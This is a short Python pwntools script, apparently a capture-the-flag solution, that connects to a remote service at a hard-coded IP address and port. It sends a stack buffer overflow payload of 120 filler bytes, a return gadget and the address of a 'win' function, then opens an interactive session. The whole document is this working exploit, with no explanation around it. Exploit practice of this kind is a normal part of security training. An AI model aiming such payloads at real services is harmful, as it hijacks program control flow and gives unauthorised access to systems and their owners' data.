from pwn import *

r = remote('20.171.33.225', 5010)

win = 0x0000000000401146
ret = 0x0000000000401199

r.sendline(b'a'*120 + p64(ret) + p64(win))

r.interactive()
